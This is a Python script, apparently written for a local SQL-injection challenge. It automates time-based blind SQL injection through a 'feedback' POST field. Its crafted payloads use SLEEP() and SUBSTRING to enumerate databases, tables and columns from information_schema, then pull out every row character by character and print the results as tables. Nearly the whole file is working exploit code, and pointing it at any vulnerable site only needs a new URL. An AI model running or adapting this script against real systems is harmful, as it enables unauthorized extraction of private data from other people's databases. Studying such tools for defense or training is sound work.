from itertools import zip_longest
from prettytable import PrettyTable
from urllib.parse import urlencode
from urllib.request import Request, urlopen
import time
import re

letters = 'abcdefghijklmnopqrstuvwxyz0123456789_-.:;#()/\\$&\"!@? ´`+\''
url = 'http://localhost/challenge/sql/5.php'  # Set destination URL here


def check_offset(sleep_delay, database, table_name, column_name, func):
    tables = []
    offset = 0
    entries_exhausted = False
    while not entries_exhausted:
        found_entry = check_index(sleep_delay, database, table_name, column_name, func, offset)
        if not found_entry:
            entries_exhausted = True
        else:
            tables.append(found_entry)
            offset += 1
    return tables


def check_index(sleep_delay, database, table_name, column_name, func, offset):
    index = 1
    spaces = 0
    word = ""
    while spaces < 2:
        found_char = check_chars(sleep_delay, database, table_name, column_name, func, offset, index)
        # print(found_char)
        if not found_char:
            return word
        elif found_char == " ":
            word += found_char
            spaces += 1
        elif found_char:
            word += found_char
            spaces = 0
        index += 1
    if re.match(r"[^\S\n\t]+", word):
        return word
    else:
        return word.strip()



def check_chars(sleep_delay, database, table_name, column_name, func, offset, index):
    found_char = ""
    search_successful = False
    while not search_successful:
        request_times = []
        for char in letters:
            if char == "'":
                char = char.replace("'", r"\'")
            this_request = check_which_function(index, char, func, offset, database, table_name, sleep_delay, column_name)
            if this_request > sleep_delay:
                # we have a canidate
                request_times.append(this_request)
                found_char = char
        if len(request_times) == 1:
            search_successful = True
        elif len(request_times) == 0:
            found_char = None
            search_successful = True
    return found_char


def check_which_function(index, char, func, offset, database, table_name, sleep_delay, column_name):
    this_request = 0
    if func == "database":
        this_request = search_database_names(index, char, offset, sleep_delay)
    elif func == "table":
        this_request = search_table_names(index, char, offset, sleep_delay, database)
    elif func == "column":
        this_request = search_column_names(index, char, offset, table_name, sleep_delay, database)
    elif func == "entry":
        this_request = search_column_entries(index, char, offset, table_name, sleep_delay, column_name)
    return this_request


def calibrate_request_delay():
    print("\nCalibrating delay")
    post_fields = {'feedback': 'payload'}
    request = Request(url, urlencode(post_fields).encode())
    cal_times = []
    for i in range(1000):
        start = time.time()
        urlopen(request).read().decode()
        end = time.time() - start
        cal_times.append(end)
    cal_time = max(cal_times)
    sleep_delay = cal_time * 1.5
    print("Assumed maximum delay: {:.7} seconds".format(cal_time))
    return sleep_delay


def send_request(post_fields):
    request = Request(url, urlencode(post_fields).encode())
    start_time = time.time()
    urlopen(request).read().decode()
    total_time = time.time() - start_time
    return total_time


def search_database_names(index, char, offset, sleep_delay):
    payload = 'payload."\'|(' \
              'SELECT IF(SUBSTRING(schema_name,{},1)=\'{}\',SLEEP({}),0) ' \
              'FROM information_schema.schemata WHERE schema_name != \'mysql\' ' \
              'AND schema_name != \'information_schema\' ' \
              'AND schema_name != \'performance_schema\' ' \
              'LIMIT 1 OFFSET {}),0,CURRENT_TIMESTAMP,17)#"\''
    payload = payload.format(index, char, sleep_delay, offset)
    post_fields = {'feedback': payload}
    return send_request(post_fields)


def search_table_names(index, char, offset, sleep_delay, database):
    #searches for one char with one index and one offset; single instance request
    payload = 'payload."\'|(' \
              'SELECT IF(SUBSTRING(table_name,{},1)=\'{}\',SLEEP({}),0) ' \
              'FROM information_schema.tables WHERE table_schema = \'{}\' '\
              'LIMIT 1 OFFSET {}),0,CURRENT_TIMESTAMP,17)#"\''
    payload = payload.format(index, char, sleep_delay, database, offset)
    post_fields = {'feedback': payload}
    return send_request(post_fields)


def search_column_names(index, char, offset, table_name, sleep_delay, database):
    #searches for one char with one index and one offset; single instance request
    payload = 'payload."\'|(' \
              'SELECT IF(SUBSTRING(column_name,{},1)=\'{}\',SLEEP({}),0) ' \
              'FROM information_schema.columns WHERE table_schema = \'{}\' ' \
              'AND table_name = \'{}\' ' \
              'LIMIT 1 OFFSET {}),0,CURRENT_TIMESTAMP,17)#"\''
    payload = payload.format(index, char, sleep_delay, database, table_name, offset)
    post_fields = {'feedback': payload}
    return send_request(post_fields)


def search_column_entries(index, char, offset, table_name, sleep_delay, column_name):
    #searches for one char with one index and one offset; single instance request
    # omitting '6' from entries search to stop endless loping on columns where the payload gets injected
    payload = 'payload."\'|(' \
              'SELECT IF(SUBSTRING({},{},1)=\'{}\',SLEEP({}),0) ' \
              'FROM {} ' \
              'LIMIT 1 OFFSET {}),0,CURRENT_TIMESTAMP,17)#"\''

    payload = payload.format(column_name, index, char, sleep_delay, table_name, offset)
    # print(repr(payload))
    # print(payload)
    post_fields = {'feedback': payload}
    return send_request(post_fields)


def search_for_databases(sleep_delay):
    found_databases = check_offset(sleep_delay, "", "", "", "database")
    print("\nDatabases found: " + str(found_databases))
    return found_databases

def search_for_tables(sleep_delay, database):
    found_tables = check_offset(sleep_delay, database, "", "", "table")
    print("Tables found in " + str(database) + ": " + str(found_tables))
    return found_tables


def search_for_columns(sleep_delay, database):
    found_columns = {}
    found_tables = search_for_tables(sleep_delay, database)
    for table in found_tables:
        found_columns[table] = check_offset(sleep_delay, database, table, "", "column")
    for table_name, column_names in found_columns.items():
          print("Columns found for table \'" + table_name + "\': " + str(column_names))
    return found_columns


def search_for_entries(sleep_delay, database):
    complete_entries = {}
    found_columns = search_for_columns(sleep_delay, database)
    for table, column_names in found_columns.items():
        found_entries = {}
        columns_for_table = column_names
        for single_column in columns_for_table:
            entry = check_offset(sleep_delay, database, table, single_column, "entry")
            print("Entries found for \'" + table + "." + single_column + "\': " + str(entry))
            found_entries[single_column] = entry
        complete_entries[table] = found_entries
    return complete_entries


def make_pretty_tables(sleep_delay):
    print("Beginning injection")
    databases = search_for_databases(sleep_delay)
    for database in databases:
        print("\nInjecting in Database: "+ str(database))
        complete_entries = search_for_entries(sleep_delay, database)
        for table, column_names in complete_entries.items():
            key_table = PrettyTable(column_names)
            rows = []
            for single_column, entries in column_names.items():
                rows.append(entries)
            for list in zip_longest(*rows, fillvalue=' '):
                key_table.add_row(list)
            print("\nTablename: " + database + "." + table)
            key_table.align = "l"
            print(key_table)


def main():
    sleep_delay = calibrate_request_delay()
    start_time = time.time()
    make_pretty_tables(sleep_delay)
    total_time = time.time() - start_time
    print("\nFinished")
    print("Total search time: {:.4} seconds".format(total_time))


if __name__ == '__main__':
    main()